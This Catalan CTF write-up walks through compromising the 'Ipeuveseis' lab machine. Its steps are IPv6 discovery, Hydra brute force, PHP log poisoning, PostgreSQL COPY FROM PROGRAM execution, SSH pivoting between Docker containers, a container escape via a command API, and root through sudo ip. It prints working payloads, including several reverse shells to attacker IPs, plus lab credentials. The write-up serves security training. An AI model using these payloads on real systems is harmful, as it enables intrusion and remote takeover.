---
author: Lenam  
pubDatetime: 2026-02-01T00:00:00Z  
title: WriteUp Ipeuveseis - TheHackersLabs  
urlSlug: ipeuveseis-writeup-thehackerslabs  
featured: true
draft: false  
ogImage: "../../../assets/images/ipeuveseis/OpenGraph.png"  
tags:
  - writeup
  - TheHackersLabs
  - IPv6
  - PostgreSQL
  - log poisoning
  - Docker
description:  
  Writeup del repte "Ipeuveseis" de The Hackers Labs, centrat en atacar serveis IPv6, salt de contenidors i escalada de privilegis. Perfecte per practicar tècniques de pentesting en entorns amb contenidors i IPv6.
lang: ca
translationId: ipeuveseis-writeup-thehackerslabs
---

A continuació es detalla una manera de resoldre el CTF de la màquina Ipeuveseis de The Hackers Labs. Aquest repte es pot abordar de diferents maneres; aquí trobaràs una d'elles, tot i que també és recomanable consultar altres writeups de la comunitat per contrastar enfocaments i continuar aprenent.

## Taula de continguts

## Enumeració

A diferència d'altres màquines de la mateixa plataforma, en aquesta ocasió no es mostra l'adreça IP de la màquina objectiu, per la qual cosa hem de trobar-la pels nostres propis mitjans.

![](../../../assets/images/ipeuveseis/20260121_012845_image.png)

La xarxa de la màquina virtual està configurada en mode adaptador pont, per identificar la IP de la màquina, emprem arp-scan. Com que estem usant VirtualBox, sabem que les adreces MAC de les seves targetes de xarxa solen començar per `08:00:27`.

```
$ sudo arp-scan --localnet | grep 08:00:27
192.168.1.122   08:00:27:ca:f1:cb       (Unknown)
```

- `sudo arp-scan --localnet` envia paquets ARP a tots els dispositius de la xarxa local per descobrir quins estan actius i obtenir les seves adreces IP i MAC.
- L'ús de `grep 08:00:27` filtra la sortida mostrant només aquelles línies on la MAC comença per aquest identificador característic.

El resultat mostra que s'ha trobat un dispositiu amb IP `192.168.1.122` i adreça MAC `08:00:27:ca:f1:cb`, que presumiblement correspon a la nostra màquina objectiu.

Tot i que hem aconseguit identificar l'adreça IP de la màquina objectiu, en efectuar un escaneig de ports no s'observa cap obert.

```bash
$ nmap -p- 192.168.1.122
Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-21 01:38 CET
Nmap scan report for 192.168.1.122
Host is up (0.000095s latency).
All 65535 scanned ports on 192.168.1.122 are in ignored states.
Not shown: 65535 closed tcp ports (conn-refused)

Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
```

En analitzar el nom de la màquina, `ipeuveseis`, notem que correspon a la pronunciació de `IPv6` en castellà. Això ens porta a pensar que la màquina podria estar configurada per exposar els seus serveis únicament a través d'IPv6, per la qual cosa procedim a cercar l'adreça IPv6 de l'objectiu.

En aquest punt convé aclarir per què no es pot fer un escaneig tradicional de tot el rang, com sol fer-se en IPv4. En IPv4, una xarxa típica /24 té 256 adreces possibles, cosa que fa factible enviar un ping o un escaneig a tot el rang. No obstant això, en IPv6 els rangs solen ser /64, cosa que implica 2^64 adreces possibles:

2⁶⁴ = **18.446.744.073.709.551.616 adreces**

Escanejar totes les adreces d'un /64 en IPv6 és impossible per la quantitat immensa d'IPs possibles, així que no funcionen els escombrats típics d'IPv4. Per això cal usar tècniques com la multidifusió per descobrir dispositius.

Per identificar dispositius actius amb IPv6 a la xarxa local quan no coneixem les seves adreces, podem fer un ping multicast a tots els nodes; a més, si sabem la MAC de la màquina objectiu, podem calcular directament la seva IPv6 link-local aplicant el format EUI-64 (prefix `fe80::/64`), deduint-la sense esperar resposta al ping.

Per realitzar el ping, emprem la comanda següent:

```bash
ping6 -c 2 "ff02::1%eth0"
```

![Resposta ping6](../../../assets/images/ipeuveseis/20260121_021022_image.png)

Aquesta comanda envia dos paquets ICMPv6 (per l'opció `-c 2`) a l'adreça de multidifusió link-local `ff02::1` a través de la interfície de xarxa especificada (`eth0`). Aquesta adreça correspon a "tots els nodes" connectats a la xarxa local, per la qual cosa qualsevol dispositiu amb IPv6 respondrà. És una tècnica molt útil per enumerar hosts actius en xarxes IPv6.

Tanmateix, tingues en compte que **les respostes a aquest tipus de ping mostraran normalment només les adreces IPv6 link-local** (`fe80::/64`) dels dispositius, ja que aquestes són les úniques que necessàriament té cada interfície i són vàlides únicament dins del segment de xarxa local.

No és habitual que la comanda `ping6` mostri directament adreces ULA (`fd00::/8`) o globals en les respostes, fins i tot si existeixen i estan configurades als hosts. Per descobrir si un dispositiu té adreces globals o ULA assignades, normalment hem d'usar eines addicionals, com nmap amb opcions IPv6.

Cada host pot respondre mostrant una o diverses de les seves adreces IPv6, però habitualment només veuràs la link-local tret que el sistema estigui configurat específicament per respondre usant-ne una altra.

Ara ja podem realitzar un escaneig de nmap amb l'adreça local trobada.

```bash
nmap -p- -sVC -6 fe80::a00:27ff:feca:f1cb%eth0
```

![nmap a ipv6 local](../../../assets/images/ipeuveseis/20260121_021317_image.png)

El resultat de l'escaneig de nmap revela informació important sobre els serveis exposats a la màquina objectiu:

- **Port 22/tcp (SSH)**: Està obert i executant OpenSSH versió 10.0p2 en Debian 7. Aquest servei utilitza el protocol 2.0 de SSH.
- **Port 8080/tcp (HTTP)**: Està obert i executant un servidor web Apache httpd versió 2.4.66 en Debian.
- **Sistema Operatiu**: S'identifica com a Linux (Debian).
- **Adreça MAC**: `08:00:27:CA:F1:CB`, que correspon a una NIC virtual d'Oracle VirtualBox, confirmant que es tracta d'una màquina virtual.

L'script `address-info` de nmap també confirma que l'adreça MAC correspon a un adaptador de xarxa virtual de VirtualBox.

És important destacar que aquest escaneig es va realitzar utilitzant l'adreça IPv6 link-local (`fe80::a00:27ff:feca:f1cb`), que només és vàlida dins del segment de xarxa local. Per accedir a serveis web des d'un navegador o realitzar connexions més estables, necessitarem obtenir una adreça IPv6 global o ULA (Unique Local Address) de l'objectiu.

Per aconseguir la IPv6 podem utilitzar l'script `targets-ipv6-multicast-echo` de nmap.

```bash
sudo nmap -6 -sL --script targets-ipv6-multicast-echo --script-args 'newtargets,interface=eth0'
```

![Resultat nmap targets-ipv6-multicast-echo](../../../assets/images/ipeuveseis/20260121_022343_image.png)

Tot i que no és imprescindible, resulta més còmode treballar si aconseguim una adreça IPv6 global (normalment comença per `2XXX:`). A la captura anterior, l'adreça real d'IPv6 s'ha ocultat per privacitat.

**Has d'anotar l'adreça IPv6 que coincideixi amb l'adreça MAC obtinguda anteriorment** (`08:00:27:CA:F1:CB` en el nostre cas). Aquesta serà l'adreça IPv6 global de la màquina víctima que utilitzarem per accedir als serveis web i realitzar les fases següents de l'atac.

Per als exemples següents d'aquest writeup, utilitzarem l'adreça IPv6 global d'exemple `2001:db8::1` (el prefix `2001:db8::/32` està reservat per a documentació i exemples segons RFC 3849).

Ara podem obrir el navegador al port 8080 trobat amb la IPv6 obtinguda. Com que les adreces IPv6 contenen dos punts, és necessari escriure la URL amb el format següent:

```text
http://[2001:db8::1]:8080/
```

Substitueix `2001:db8::1` per l'adreça IPv6 global que vas obtenir prèviament.

![](../../../assets/images/ipeuveseis/20260121_023149_image.png)

## Vulneració

A la web trobada al port 8080 es mostra un **formulari de validació d'usuaris**. Ens inventem un domini i l'afegim al fitxer hosts per no haver d'introduir la IP contínuament (substitueix `2001:db8::1` per l'adreça IPv6 global que vas obtenir).

```bash
echo "2001:db8::1 ipv6.thl" | sudo tee -a /etc/hosts
```

Ara també podem accedir a la URL [`http://ipv6.thl:8080`](http://ipv6.thl:8080).

### Força bruta de credencials

Intentem realitzar un atac de força bruta amb Hydra utilitzant els noms d'usuari del diccionari `.../metasploit/http_default_users.txt` i les contrasenyes més comunes de `.../seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt`.

```bash
hydra -6 -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -s 8080 -f ipv6.thl http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"
```

![Resultat de força bruta de credencials amb Hydra](../../../assets/images/ipeuveseis/20260121_025213_image.png)

L'atac de força bruta va revelar les credencials `admin:admin123`, que permeten accedir fàcilment al panell i veure les seccions `logs.php` i `about.php`. És una combinació tan òbvia que es podria endevinar sense eines.

### Log Poisoning per a RCE

![Pàgina logs.php](../../../assets/images/ipeuveseis/20260121_030509_image.png)

Al fitxer `logs.php` podem visualitzar els registres del servei web, per la qual cosa podem intentar un log poisoning sense necessitat de trobar un LFI.

1. **Obtenir cookie de sessió després del login:**

```bash
# Fer login i guardar la cookie en un arxiu
curl -6 -c cookies.txt -X POST -d "username=admin&password=admin123" http://ipv6.thl:8080/index.php

# Verificar que la cookie s'ha guardat correctament
cat cookies.txt
```

2. **Injectar codi PHP al User-Agent:**

```bash
# Aquest curl funciona sense cookie perquè index.php no requereix autenticació per rebre peticions
curl -6 -A "<?php system(\$_GET['cmd']); ?>" http://ipv6.thl:8080/
```

3. **Executar comandes usant la cookie de sessió:**

```bash
# Accedir a logs.php amb la cookie de sessió per executar comandes
curl -6 -b cookies.txt "http://ipv6.thl:8080/logs.php?log=access&cmd=id"
```

4. **Obtenir reverse shell:**

```bash
# Escoltar a la teva màquina atacant.
nc -lvnp 4444

# Executa la reverse shell accedint a logs.php amb la cookie. Recorda substituir la IP (192.168.1.123) de la reverse shell per la de la teva màquina atacant.
curl -6 -b cookies.txt "http://ipv6.thl:8080/logs.php?log=access&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.123%2F4444%200%3E%261%22%20%26"
```

Obtenim una shell amb l'usuari www-data.

![Reverse shell www-data](../../../assets/images/ipeuveseis/20260121_030224_image.png)

## Moviment lateral

És recomanable assegurar-se de tenir una TTY completa per treballar còmodament amb la shell. Això es pot aconseguir manualment o bé emprant eines com `rlwrap`, `penelope`, o una pròpia, com en el meu cas, mitjançant [shell_automation_tool](https://github.com/Len4m/shell_automation_tool).

### Del contenidor web al contenidor de la base de dades

Un cop estabilitzada la sessió, procedim a explorar els fitxers del lloc web i les variables d'entorn, cosa que ens permet cercar credencials, configuracions sensibles i possibles vectors per escalar privilegis o moure's lateralment dins del sistema.

El fitxer de configuració de la base de dades del lloc web:

```bash
www-data@ctf:/var/www/html$ head -n 30 ../config/database.php
<?php
/**
 * Database Configuration
 * 
 * WARNING: This file contains sensitive credentials
 * TODO: Move to environment variables (NEVER commit this!)
 * 
 * ===========================================
 * INTERNAL USE ONLY - Database Credentials
 * ===========================================
 * 
 * Application User:
 *   Host: fd00:1337:1::20
 *   Port: 5432
 *   Database: database
 *   User: user
 *   Pass: jec41Ew98zB4ch3nM0vP
 * 
 * Super Admin (for maintenance only):
 *   User: superadmin
 *   Pass: jHt9b8u5whZ55551zlY1
 */

// Application database credentials
define('DB_HOST', getenv('DB_HOST') ?: 'fd00:1337:1::20');
define('DB_PORT', getenv('DB_PORT') ?: '5432');
define('DB_NAME', getenv('DB_NAME') ?: 'database');
define('DB_USER', getenv('DB_USER') ?: 'user');
define('DB_PASS', getenv('DB_PASS') ?: 'jec41Ew98zB4ch3nM0vP');

```

Les variables d'entorn.

```bash
www-data@ctf:/var/www/html$ printenv | grep DB
DB_PORT=5432
DB_USER=user
DB_HOST=fd00:1337:1::20
DB_NAME=database
DB_PASS=jec41Ew98zB4ch3nM0vP

```

Credencials obtingudes:

- `user` / `jec41Ew98zB4ch3nM0vP`
- `superadmin` / `jHt9b8u5whZ55551zlY1`

Observant la programació del lloc web i el port de connexió de la base de dades, podem deduir que aquestes credencials permeten connectar-se a un servidor PostgreSQL a l'adreça IPv6 `fd00:1337:1::20` usant el port `5432`.

```bash
www-data@ctf:/var/www/html$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo 
       valid_lft forever preferred_lft forever
2: eth0@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 8e:39:3a:1d:8b:4a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fd00:1337:1::10/64 scope global nodad 
       valid_lft forever preferred_lft forever
    inet6 fe80::8c39:3aff:fe1d:8b4a/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
3: eth1@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether d2:f1:ef:39:09:c8 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fd00:dead:beef::20/64 scope global nodad 
       valid_lft forever preferred_lft forever
    inet6 fe80::d0f1:efff:fe39:9c8/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
```

La comanda `ip a` revela que el contenidor disposa de dues interfícies de xarxa principals, cadascuna amb una adreça IPv6 global ULA:

- **eth0:** `fd00:1337:1::10/64`
- **eth1:** `fd00:dead:beef::20/64`

Això indica que el contenidor està connectat simultàniament a dues xarxes: `fd00:1337:1::/64`, que permet l'accés a PostgreSQL utilitzant les credencials obtingudes, i `fd00:dead:beef::/64`, cosa que podria facilitar la comunicació amb altres serveis o contenidors presents en aquesta subxarxa.

Podem connectar a la BD de PostgreSQL amb les credencials de l'usuari `superadmin` obtingudes des del contenidor del lloc web.

```bash
www-data@ctf:/var/www/html$ psql -h fd00:1337:1::20 -U superadmin database
Password for user superadmin: 
psql (17.7 (Debian 17.7-0+deb13u1), server 15.15)
Type "help" for help.

database=# 
```

### Del contenidor de la base de dades al contenidor de Backups

Verifiquem que l'usuari és superusuari/administrador de la base de dades usant la comanda `\du`, cosa que ens atorga permisos elevats a PostgreSQL.

```sql
database-# \d
                  List of relations
 Schema |        Name        |   Type   |   Owner  
--------+--------------------+----------+------------
 public | backup_logs        | table    | superadmin
 public | backup_logs_id_seq | sequence | superadmin
 public | users              | table    | superadmin
 public | users_id_seq       | sequence | superadmin
(4 rows)

database-# \du
                              List of roles
 Role name  |                         Attributes             
------------+------------------------------------------------------------
 superadmin | Superuser, Create role, Create DB, Replication, Bypass RLS
 user       | 
```

Amb l'atribut de `Superuser`, pots executar comandes del sistema usant els payloads següents.

```sql
-- Executar comanda id
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM 'id';
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

Observem que som l'usuari postgres.

```sql
-- Xarxes i IPs del contenidor de la base de dades
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM 'ip a';
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

El resultat de la comanda `ip a` mostra que el contenidor té dues interfícies rellevants, ambdues amb adreces IPv6 globals ULA assignades:

- **eth0:** `fd00:1337:2::20/64`
- **eth1:** `fd00:1337:1::20/64`

Ambdues interfícies presenten a més adreces link-local (`fe80::...`). Les xarxes `fd00:1337:2::/64` i `fd00:1337:1::/64` corresponen a dues xarxes internes diferents, cadascuna associada a una interfície diferent: la primera és nova, mentre que la segona coincideix amb la del contenidor web. És probable que ambdues hagin estat configurades per Docker. Aquestes adreces ULA permeten la comunicació interna entre serveis i contenidors connectats a les mateixes xarxes, cosa que facilita possibles moviments laterals en l'entorn.

```sql
-- Claus SSH filtrades de l'usuari backupuser
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM 'ls -la /home/postgres/.ssh/ && cat /home/postgres/.ssh/*';
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

![Filtració d'IP, usuari i claus SSH](../../../assets/images/ipeuveseis/20260131_192628_image.png)

En continuar investigant, trobem una clau SSH, el nom d'usuari `backupuser` i l'adreça IPv6 `fd00:1337:2::30`, la qual pertany a la xarxa prèviament identificada `fd00:1337:2::/64`.

Per entendre millor l'abast de la connectivitat entre els diferents contenidors i la nostra màquina atacant, és recomanable realitzar proves de xarxa. Si intentem fer ping a la nostra màquina des del contenidor de la base de dades, veurem que no obtenim resposta: aquest contenidor no posseeix sortida directa cap a l'exterior i, per tant, només és possible interactuar des d'altres contenidors, com el web.

Per comprovar-ho, primer podem monitoritzar el trànsit ICMPv6 a la nostra màquina usant:

```bash
sudo tcpdump -n -i any icmp6
```

Després, llancem un ping des del contenidor web, recordant que has de modificar la IP `2001:db8::10` per la corresponent a la teva màquina atacant:

```bash
ping -6 -c 1 2001:db8::10
```

Alternativament, podem executar una comanda equivalent des de la base de dades PostgreSQL utilitzant PSQL:

```sql
-- El contenidor de la base de dades no disposa de connectivitat cap a l'exterior.
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM 'ping -6 -c 1 2001:db8::10';
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

Així, queda demostrat que només el contenidor web pot comunicar-se de forma directa amb la nostra màquina atacant, mentre que el contenidor de la base de dades no té aquesta possibilitat de sortida.

També és possible aprofundir en la investigació realitzant un escaneig de ports sobre la IP del gateway de les xarxes a les quals tenim accés des del host. No obstant això, en efectuar una cerca per força bruta, únicament es detecta el port 22 obert, al qual no disposem d'accés permès.

Intentem accedir al contenidor de backup (`fd00:1337:2::30`) mitjançant SSH des del contenidor de la base de dades, utilitzant l'usuari i la clau prèviament obtinguts, i executant la comanda `ip a` per consultar la configuració de xarxa d'aquest contenidor.

```sql
-- Xarxes i IPs del contenidor de la base de dades
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM $$
ssh -6 -i /home/postgres/.ssh/id_rsa backupuser@fd00:1337:2::30 "ip a"
$$;
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

![Configuració IP contenidor backups](../../../assets/images/ipeuveseis/20260201_205311_image.png)

Podem observar que el contenidor de backups està connectat a dues xarxes diferents: la xarxa `fd00:dead:beef::/64` (associada a la interfície `eth0`) i la xarxa `fd00:1337:2::/64` (associada a la interfície `eth1`).

En resum, els diferents contenidors estan connectats a tres xarxes internes diferents dins de l'stack Docker, les adreces de les quals es detallen a continuació.

![Configuració IP contenidor backups](../../../assets/images/ipeuveseis/docker-lan.png)

Hem comprovat que, tot i que el contenidor web té connectivitat cap a l'exterior, el contenidor de la base de dades PostgreSQL no en disposa. Tanmateix, el contenidor de backup sí que pot comunicar-se amb l'exterior, ja que té un dispositiu de xarxa a la mateixa xarxa `fd00:dead:beef::/64` que el contenidor web.

Per confirmar la connectivitat des del contenidor de backups cap a la nostra màquina atacant, podem emprar SSH i executar una comanda de ping de la manera següent.

Primer, a la màquina atacant, captura els paquets ICMPv6 per observar el trànsit entrant:

```bash
sudo tcpdump -n -i any icmp6
```

Després, des de la base de dades, establim una connexió SSH al contenidor de backup i realitzem un ping a l'adreça IPv6 de la nostra màquina atacant (recorda substituir `2001:db8::10` per la IP corresponent):

```sql
-- Verificació de connectivitat des del contenidor de backup
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM $$
ssh -6 -i /home/postgres/.ssh/id_rsa backupuser@fd00:1337:2::30 "ping -6 -c 1 2001:db8::10"
$$;
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

D'aquesta manera, comprovem que el contenidor de backup pot establir comunicació directa amb la nostra màquina atacant, utilitzant la xarxa a la qual també té accés el contenidor web.

Ara que hem verificat la connectivitat entre el contenidor de backups i la nostra màquina atacant mitjançant IPv6, podem preparar un listener per rebre la shell reversa.

A la nostra màquina atacant, iniciem l'escolta al port 443 usant Netcat amb suport IPv6:

```bash
nc -6 -lvnp 443
```

A continuació, des de la base de dades, aprofitant la connexió SSH al contenidor de backups, executem el payload següent per obtenir una reverse shell (recorda substituir `2001:db8::10` per l'adreça IPv6 global de la teva màquina):

```sql
-- Reverse shell des del contenidor de backup cap a la màquina atacant
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM $$
ssh -6 -i /home/postgres/.ssh/id_rsa backupuser@fd00:1337:2::30 "nc 2001:db8::10 443 -e sh"
$$;
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

o

```sql
DROP TABLE IF EXISTS cmd_tbl;
CREATE TABLE cmd_tbl(cmd_output TEXT);
COPY cmd_tbl FROM PROGRAM $$
ssh -6 -i /home/postgres/.ssh/id_rsa backupuser@fd00:1337:2::30 "bash -i >& /dev/tcp/2001:db8::10/443 0>&1"
$$;
SELECT * FROM cmd_tbl;
DROP TABLE IF EXISTS cmd_tbl;
```

D'aquesta forma, en executar-se correctament la comanda anterior, obtindràs una shell interactiva al contenidor de backups directament a la teva màquina atacant.

![shell en contenidor backup](../../../assets/images/ipeuveseis/20260201_232709_image.png)

> Nota: Aquests passos es poden dur a terme de diferents maneres; per exemple, també podries emprar eines com chisel, socat, proxychains o altres tècniques alternatives segons les teves preferències o l'entorn disponible.

## Escapant del contenidor Docker

Des del contenidor de backup, és recomanable realitzar un escaneig dels ports accessibles al gateway de la xarxa interna (`fd00:dead:beef::1`). Això ens permet identificar serveis exposats únicament a la xarxa a la qual pertanyen els contenidors interns.

```bash
export ip=fd00:dead:beef::1
for port in $(seq 1 65535); do
  timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open" 2>/dev/null
done
```

Durant el reconeixement, a més del port 8080 (que correspon a l'accés al contenidor web), detectem el port 8081 exposat al gateway. Crida l'atenció que aquest port és visible des del contenidor de backups, però no és accessible des del contenidor web, malgrat compartir la mateixa xarxa interna. Això suggereix que existeix algun tipus de restricció, a nivell de firewall o configuració de xarxa, que únicament permet al contenidor de backup comunicar-se amb aquest servei concret al host.

![Escàner ports](../../../assets/images/ipeuveseis/20260202_000607_image.png)

Anem a investigar quin servei es troba actiu al port 8081 del gateway intern. Per a això, realitzem una petició HTTP amb curl:

```bash
curl -o- http://[fd00:dead:beef::1]:8081
```

La resposta és un objecte JSON que ens descriu el funcionament d'una API orientada a un repte CTF usant adreces IPv6. El servei ens planteja un desafiament que consisteix a convertir una llista d'adreces MAC al format d'adreça IPv6 usant EUI-64, i després validar-les amb una petició POST.

```json
{
  "message": "IPv6 CTF API",
  "challenge": {
    "description": "Convert the following MAC addresses to IPv6 using EUI-64 format",
    "mac_addresses": [
      "00:11:22:33:44:55",
      "AA:BB:CC:DD:EE:FF",
      "12:34:56:78:9A:BC",
      "DE:AD:BE:EF:CA:FE",
      "01:23:45:67:89:AB"
    ],
    "total_macs": 5,
    "instructions": {
      "step1": "Convert each MAC address to IPv6 using EUI-64 format. Use the standard IPv6 link-local prefix",
      "step2": "Send a POST request to /validate with the following JSON structure:",
      "request_structure": {
        "mac_addresses": "Array of all MAC addresses from the challenge (in the same order)",
        "ipv6_addresses": "Array of corresponding IPv6 addresses (one for each MAC, in the same order)"
      },
      "example_request": {
        "mac_addresses": [
          "11:22:33:44:55:66",
          "FF:EE:DD:CC:BB:AA"
        ],
        "ipv6_addresses": [
          "fe80::1322:33ff:fe44:5566",
          "fe80::ffee:ddff:fecc:bbaa"
        ]
      },
      "requirements": [
        "You must send ALL MAC addresses from the challenge list above",
        "You must send the same number of IPv6 addresses as MAC addresses",
        "The order of MAC addresses and IPv6 addresses must match",
        "All conversions must be correct to proceed",
        "Use Content-Type: application/json header"
      ]
    }
  },
  "endpoints": {
    "/validate": {
      "method": "POST",
      "description": "Validate MAC addresses and convert to IPv6 (must validate ALL MACs)",
      "required_parameters": {
        "mac_addresses": "Array of MAC addresses (all from challenge)",
        "ipv6_addresses": "Array of corresponding IPv6 addresses in EUI-64 format"
      },
      "example": {
        "mac_addresses": [
          "11:22:33:44:55:66"
        ],
        "ipv6_addresses": [
          "fe80::1322:33ff:fe44:5566"
        ]
      }
    },
    "/execute": {
      "method": "POST",
      "description": "Execute command (requires ALL MACs to be validated first)",
      "required_parameters": {
        "command": "Command to execute"
      }
    },
    "/status": {
      "method": "GET",
      "description": "Check validation status"
    }
  }
```

L'estructura principal del repte és la següent:

- **endpoints:** Endpoints disponibles:
  - `/validate` (POST): Valida el repte enviant les adreces.
  - `/execute` (POST): Permet executar comandes (només després de superar la validació prèvia).
  - `/status` (GET): Consulta l'estat de validació.

A continuació es llisten les adreces MAC que has de transformar a adreces IPv6 emprant el format EUI-64.

```json
{
   "mac_addresses": [
      "00:11:22:33:44:55",
      "AA:BB:CC:DD:EE:FF",
      "12:34:56:78:9A:BC",
      "DE:AD:BE:EF:CA:FE",
      "01:23:45:67:89:AB"
   ],
}
```

Pots revisar l'apartat d'`instructions` al JSON si vols veure els passos exactes, però aquí t'explico el procés manualment perquè s'entengui i n'aprenguem més.

Suposem que tenim la MAC **00:11:22:33:44:55**.

- **Pas 1: Inserir `FF:FE` al mig (format EUI-64).**
  Agafem els primers tres bytes i els últims tres, i entremig col·loquem `FF:FE`:

  > **00:11:22:FF:FE:33:44:55**
  >

- **Pas 2: Canviar el bit U/L del primer byte.**
  Això s'aconsegueix fent un XOR amb 02 al primer byte.

  Primer byte original: `00`

  `00 XOR 02 = 02`

  El resultat ara és:

  > **02:11:22:FF:FE:33:44:55**
  >

- **Pas 3: Convertir a format IPv6 agrupant en blocs de 4 dígits hex.**
  Agrupem els bytes resultants:

  > **0211:22FF:FE33:4455**
  >

- **Pas 4: Afegir el prefix link-local estàndard (`FE80::/64`).**
  El resultat final de la conversió és:

  > **FE80::0211:22FF:FE33:4455**
  >

> **Compte:** Pots usar ChatGPT, un script o fer-ho a mà, però l'important és entendre el procés i no només copiar la resposta.

A continuació, la solució a l'endpoint validate.

```bash
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/validate" \
  -H "Content-Type: application/json" \
  -d "{\"mac_addresses\":[\"00:11:22:33:44:55\",\"AA:BB:CC:DD:EE:FF\",\"12:34:56:78:9A:BC\",\"DE:AD:BE:EF:CA:FE\",\"01:23:45:67:89:AB\"],\"ipv6_addresses\":[\"fe80::211:22ff:fe33:4455\",\"fe80::a8bb:ccff:fedd:eeff\",\"fe80::1034:56ff:fe78:9abc\",\"fe80::dcad:beff:feef:cafe\",\"fe80::323:45ff:fe67:89ab\"]}"
```

```bash
# Més llegible
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/validate" \
  -H "Content-Type: application/json" \
  -d @- <<'JSON'
{
  "mac_addresses": [
    "00:11:22:33:44:55",
    "AA:BB:CC:DD:EE:FF",
    "12:34:56:78:9A:BC",
    "DE:AD:BE:EF:CA:FE",
    "01:23:45:67:89:AB"
  ],
  "ipv6_addresses": [
    "fe80::211:22ff:fe33:4455",
    "fe80::a8bb:ccff:fedd:eeff",
    "fe80::1034:56ff:fe78:9abc",
    "fe80::dcad:beff:feef:cafe",
    "fe80::323:45ff:fe67:89ab"
  ]
}
JSON
```

Assumint que la validació ja va ser acceptada, aconseguim execució de comandes al host amb l'usuari `lenam`.

```bash
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/execute" \
  -H "Content-Type: application/json" \
  -d "{\"command\":\"id\"}"
```

```bash
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/execute" \
  -H "Content-Type: application/json" \
  -d "{\"command\":\"cat /etc/passwd\"}"
```

Per obtenir una shell inversa fora del contenidor, primer iniciem un listener a la nostra màquina atacant amb netcat:

```bash
nc -lvnp 5555
```

Després, des de la shell del contenidor de backups, llancem la reverse shell cap a la nostra màquina (recorda substituir la IP `192.168.1.123` per la corresponent al teu equip atacant):

```bash
curl -sS -X POST "http://[fd00:dead:beef::1]:8081/execute" \
  -H "Content-Type: application/json" \
  -d "{\"command\":\"nc 192.168.1.123 5555 -e /bin/bash\"}"
```

En connectar, aconseguim sortir del contenidor i obtenir accés a la màquina host.

![](../../../assets/images/ipeuveseis/20260202_003358_image.png)

A continuació, podem llegir la flag d'usuari executant:

```bash
cat user.txt
```

## Escalada a root

Per millorar l'experiència amb la shell, és recomanable habilitar un TTY interactiu o bé copiar la nostra clau SSH al sistema compromès, aconseguint així persistència i un entorn més funcional.

El pas següent és comprovar quins privilegis tenim amb `sudo`, executant:

```bash
sudo -l
```

![sudo lenam user](../../../assets/images/ipeuveseis/20260104_225105_image.png)

Observem que l'usuari `lenam` pot executar la comanda `ip` com a root sense necessitat d'introduir una contrasenya. També apareixen dos scripts (`block-web-host-access.sh` i `remove-web-host-block.sh`) a la llista de comandes permeses, tot i que no disposem d'accés de lectura als mateixos. Pels seus noms, tot apunta a que s'empren per gestionar l'accés al host web.

Per escalar privilegis a root, aprofitem els permisos sobre el binari `ip`, seguint la tècnica descrita a GTFOBins. Les comandes necessàries són:

```bash
sudo ip netns add mynetns
sudo ip netns exec mynetns /bin/bash
```

Després d'executar aquests passos, obtindrem una shell amb privilegis de root. Ara només queda llegir la flag de l'usuari root:

```bash
cat /root/root.txt
```

![root flag](../../../assets/images/ipeuveseis/20260104_225326_image.png)

> **Nota final:**  
Gràcies per llegir aquest writeup! Espero que aquest recorregut t'hagi resultat útil i que hagis après alguna cosa nova sobre IPv6, el seu format EUI-64 o tècniques d'explotació en escenaris reals.  
Per a més informació, pots consultar la [documentació d'IPv6 (RFC 4291)](https://datatracker.ietf.org/doc/html/rfc4291).  
Fins la propera!

